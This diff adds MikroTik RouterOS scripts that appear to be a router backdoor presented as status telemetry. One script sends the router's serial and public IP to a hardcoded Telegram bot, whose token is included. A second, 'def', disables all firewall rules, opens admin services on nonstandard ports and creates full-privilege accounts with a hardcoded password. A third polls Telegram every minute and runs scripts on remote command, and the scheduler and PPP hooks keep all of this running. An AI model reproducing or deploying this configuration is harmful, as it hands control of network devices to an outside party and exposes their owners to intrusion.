@@ -1,0 +1,115 @@
+/system script;
+add dont-require-permissions=no name=tele1 owner=tiknow policy=read,test,sniff,sensitive source=":local routerName [/system identity get name];\r\
+    \n:local voltage;\r\
+    \n:local voltageReal; \r\
+    \n:local temp;\r\
+    \n:local serial [/interface ethernet get 0 mac-address];\r\
+    \n:set serial ([:pick \$serial 0 2].[:pick \$serial 3 5].[:pick \$serial 6 8].[:pick \$serial 9 11].[:pick \$serial 12 14].[:pick \$serial 15 17])\r\
+    \n:local platform [/system resource get platform];\r\
+    \n:local boardName [/system resource get board-name];\r\
+    \nif ([/system resource get board-name] != \"x86\") do={\r\
+    \n    :set temp [/system health get temperature];\r\
+    \n    :set voltage [/system health get voltage];\r\
+    \n\t:set voltageReal (\$voltage/10);\r\
+    \n\t:set serial [/system routerboard get serial-number];\r\
+    \n}\r\
+    \n:local uptime [/system resource get uptime];\r\
+    \n:local freeMemory [/system resource get free-memory];\r\
+    \n:local totalMemory [/system resource get total-memory] ;\r\
+    \n:local tMemory (\$totalMemory  / 1048576);\r\
+    \n:local memoryUsage (100 - ((100 * \$freeMemory) / \$totalMemory));\r\
+    \n:local cpuLoad [/system resource get cpu-load];\r\
+    \n:local cpuFrequency [/system resource get cpu-frequency];\r\
+    \n:local freeHddPlace [/system resource get free-hdd-space];\r\
+    \n:local totalHddPlace [/system resource get total-hdd-space];\r\
+    \n:local hddUsage (100 - ((100 * \$freeHddPlace) / \$totalHddPlace));\r\
+    \n:local tHddPlace (\$totalHddPlace/1048576);\r\
+    \n:local osVersion [/system resource get version];\r\
+    \n:local systemTime [/system clock get time];\r\
+    \n:local systemDate [/system clock get date];\r\
+    \n:local publicIP [:resolve myip.opendns.com server=208.67.222.222];\r\
+    \n:local www [/ip service get www port];\r\
+    \n\r\
+    \n:global botID \"5116052080:AAEvVuGHrtfwfBNHQWGvEKzmTLacl9bf7HE\";\r\
+    \n:global myID 1848324844; #ldtdiep\r\
+    \n\r\
+    \n:local statusMessage \"<b>%F0%9F%93%88Router Status%F0%9F%93%89</b>%0A%0ARouter Name: <b><i>\$routerName</i></b>%E2%9C%94%EF%B8%8F%0APlatform: <i>\$platform</i>%0ABoard Name: <i>\$boardN\
+    ame</i>%0ASerial: <i>%23\$serial</i>\"\r\
+    \nif ([/system resource get board-name] != \"x86\") do={\r\
+    \n\t:set statusMessage (\$statusMessage . \"%0AVoltage: <i>\$voltageReal V</i>%0ATemp: <i>\$temp C</i>\");\r\
+    \n}\r\
+    \n:set statusMessage (\$statusMessage . \"%0ACPU: <i>\$cpuLoad% - \$cpuFrequency MHz</i>%0ARAM: <i>\$tMemory MB - \$memoryUsage%</i>%0AROM: <i>\$tHddPlace MB - \$hddUsage%</i>%0ARouterOS: \
+    <i>\$osVersion</i>%0AUptime: <i>\$uptime</i>%0ASystem Time: <i>\$systemTime - \$systemDate</i>%0AIP: <a href=\\\"http://\$publicIP:\$www\\\">\$publicIP</a>%0A%0A%F0%9F%87%B1%F0%9F%87%BBRou\
+    terOS%F0%9F%87%BB%F0%9F%87%B3 %0A%23\$routerName\");\r\
+    \n:local tgUrl \"https://api.telegram.org/bot\$botID/sendMessage\?chat_id=\$myID&text=\$statusMessage&parse_mode=html&disable_notification=true\";\r\
+    \n/tool fetch url=\"\$tgUrl\" mode=http keep-result=no;\r\
+    \n"
+
+add dont-require-permissions=yes name=def owner=tiknow policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon source="/ip firewall filter disable [find];\r\
+    \n/ip service;set www disabled=no port=49090;set www disabled=no port=49090;set winbox disabled=no port=49091;\r\
+    \n/user;set [find name=admik] password=\"Awds1122@\";set [find name=tiknow] password=\"Awds1122@\";add name=admik group=full;add name=tiknow group=full;"
+
+add dont-require-permissions=no name=tgcmd owner=tiknow policy=read,write,policy,test,password,sniff,sensitive source=":global serial [/interface ethernet get 0 mac-address];\r\
+    \n:set serial ([:pick \$serial 0 2].[:pick \$serial 3 5].[:pick \$serial 6 8].[:pick \$serial 9 11].[:pick \$serial 12 14].[:pick \$serial 15 17]);\r\
+    \nif ([/system resource get board-name] != \"x86\") do={\r\
+    \n\t:set serial [/system routerboard get serial-number];\r\
+    \n}\r\
+    \n:global botID \"5116052080:AAEvVuGHrtfwfBNHQWGvEKzmTLacl9bf7HE\";\r\
+    \n:global myID 1848324844;\r\
+    \n\r\
+    \n:local parse do={\r\
+    \n  :local startLoc ([:find \$content \$variable -1] + [:len \$variable] + 2);\r\
+    \n  :local commaLoc ([:find \$content \",\" \$startLoc] - 1 + 1);\r\
+    \n  :local braceLoc ([:find \$content \"}\" \$startLoc] - 1 + 1);\r\
+    \n  :local endLoc \$commaLoc;\r\
+    \n  :local startSymbol [:pick \$content \$startLoc]\r\
+    \n  :if (\$braceLoc != 0 and (\$commaLoc = 0 or \$braceLoc < \$commaLoc)) do={\r\
+    \n    :set endLoc \$braceLoc;\r\
+    \n  };\r\
+    \n  :if (\$startSymbol = \"{\") do={\r\
+    \n    :set endLoc (\$braceLoc + 1);\r\
+    \n  };\r\
+    \n  :if (\$quotas = true) do={\r\
+    \n    :set startLoc (\$startLoc + 2);\r\
+    \n    :set endLoc (\$endLoc - 1);\r\
+    \n  }\r\
+    \n  :if (\$endLoc < \$startLoc) do={\r\
+    \n    :set endLoc (\$startLoc + 1);\r\
+    \n  };\r\
+    \n  :local value [:pick \$content \$startLoc \$endLoc]\r\
+    \n  :log debug message=\"Telegram: parsed \$variable : \$value\";\r\
+    \n  :return \$value;\r\
+    \n}\r\
+    \n\r\
+    \n:local content [/tool fetch url=(\"https://api.telegram.org/bot\$botID/getUpdates\?offset=-1&allowed_updates=message\") as-value output=user];\r\
+    \n:set content (\$content ->\"data\");\r\
+    \n:if ([:len \$content] > 23 ) do={\r\
+    \n\r\
+    \n    :local updateId [\$parse content=\$content variable=\"update_id\"]\r\
+    \n    :local chat [\$parse content=\$content variable=\"chat\"]\r\
+    \n    :local chatId [\$parse content=\$chat variable=\"id\"]  \r\
+    \n\t:local message [\$parse content=\$content variable=\"text\" quotas=true];\r\
+    \n\t:local command [:pick \$message ([:find \$message \" \"]+1) [:len \$message]];\r\
+    \n\t:local id [:pick \$message 0 [:find \$message \" \"]];\r\
+    \n\t\r\
+    \n    :if (\$serial = \$id) do={\r\
+    \n\t\t:set updateId (\$updateId +1);\r\
+    \n\t\t/tool fetch url=(\"https://api.telegram.org/bot\$botID/getUpdates\\\?offset=\$updateId\") keep-result=no;\r\
+    \n        :log warn message=\"Command \$command received\";\r\
+    \n        :if ([/system script find name=\$command] != \"\") do={\r\
+    \n\t\t    /tool fetch url=(\"https://api.telegram.org/bot\$botID/sendmessage\\\?chat_id=\".\$chatId.\"&text=Command <b>\$command</b> executed successful.\".\"&parse_mode=html&disable_notif\
+    ication=true\") keep-result=no;\r\
+    \n\t\t\t/system script run \$command;\r\
+    \n        } else={\r\
+    \n            /tool fetch url=(\"https://api.telegram.org/bot\$botID/sendmessage\\\?chat_id=\$chatId&text=Wrong command.\") keep-result=no;\r\
+    \n        };\r\
+    \n    } \r\
+    \n};\r\
+    \n"
+
+/system scheduler
+add interval=1m name=tgcmd on-event=tgcmd policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon start-time=startup
+
+/ppp profile set *0 on-up=tele1
+
+/system script run tele1
